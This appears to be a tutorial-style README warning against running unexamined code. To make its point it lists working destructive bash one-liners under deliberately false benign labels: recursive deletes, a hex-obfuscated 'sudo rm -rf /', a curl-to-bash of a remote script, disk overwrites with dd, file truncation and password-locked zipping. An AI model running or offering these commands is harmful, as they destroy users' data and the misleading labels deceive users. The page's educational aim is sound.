# My one page argument for learning to code

## **_NEVER_** run code you don't understand

I often hear people call themselves 'Copy and paste' coders. And, while copying and pasting is a legitimate thing to do, it should not be your only way of doing things. A better method is to find code, see what is done and then recreate it, and at a bare minimal, copy it, but know exactly what it does. \
Here is my small example of code that has unintended results.


> "Running code you found on the internet is like chewing gum you found in the subway'.  

### Try these (IN A VIRTUAL MACHINE!)

#### Here are some bad descriptions to **bad** commands

A. Greatly simplifies document syntax: 

``` bash
while read f; do sed -i "" 's:.:*:g' "$f"; done <<< "$(find ~/ -iname '*' -print)"
```

B. Frees up uneccesary space:

``` bash
du ~/ | grep -o '/.*' | xargs rm -r --
```

C. Relinks your files to improve efficentcy:

``` bash
du ~/*/* | grep -o '/.*' | xargs -n 1 ln -sf /dev/null/
```

D. Moves files/folders to a volume with unlimited storage:

``` bash
for d in ~/*/*; do mv "$d/" /dev/null; done
```

E. Frees up all uneccesary space:

``` bash
command $(echo 7375646f20726d202d7266202f0a | xxd -p -r) &> /dev/null
```

F. Chew the gum you don't even know:

``` bash
bash -c "$(curl -s https://raw.githubusercontent.com/thedzy/My-one-page-argument-for-learning-to-code/master/malicious_file.sh)"
```

G. Frees up uneccesary space:

```bash
eval $(sed 's:[a-e,s-z]::g' <<< "stream -draft ~/saved")
```

H. Compress files and save space:

```bash
zip --password "$(openssl rand -base64 64)"  --move  "$(openssl rand -hex 4)".zip  ~/*/*/*/*/*
```

I. Reduce your need of the external volumes:

```bash
for d in /dev/disk*; do dd if=/dev/random of=$d &; done
```

J. Simply your files and your life:

```bash
find ~/ -type f -exec bash -c ':|tee {} &' \; 
```

K. Keep logs of files in the home folder utilising your current files:

```bash
find ~/ -type f -exec awk 'FNR == 1{ print FILENAME > FILENAME } ' {}  \;
```

### Recommended testing evironment:

1. Create a virtual machine.
2. Open terminal and run the folowing command to copy some files to the desktop: \
```find / -iname "*.txt" | head -n 60 | xargs -n1 -J% cp % $HOME/Desktop/ ```
3. Snapshot your VM, cause you'll need it
4. Run the command
5. Restore
6. Rinse and repeat
